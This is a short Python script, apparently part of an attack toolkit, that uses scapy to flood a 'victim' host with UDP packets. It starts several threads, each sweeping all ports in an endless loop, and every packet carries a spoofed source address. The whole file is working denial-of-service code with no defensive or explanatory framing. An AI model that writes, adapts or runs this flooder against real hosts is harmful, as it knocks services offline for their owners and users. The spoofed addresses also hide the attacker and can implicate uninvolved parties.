from scapy.all import *
import threading
from func.spoof_addr import spoof_addr

def UDPflood(victim,quiet,THREAD_COUNT):
    all_threads = []
    tc = THREAD_COUNT
    for i in range(tc):
        t = threading.Thread(target=__flood_udp,args=(tc,i,victim,quiet))
        t.daemon = True
        t.start()
        all_threads.append(t)

    all_threads[0].join()

def __flood_udp(step,start,victim,quiet):
    spoofaddr = spoof_addr()
    while True:
        for port in range(start,65535,step):
            packet = IP(src=spoofaddr,dst=victim)/UDP(dport=port)
            send(packet,verbose=0)
            if not quiet:
                print("[+] Packet send to port "+str(port)+" ID: "+str(packet.summary()))
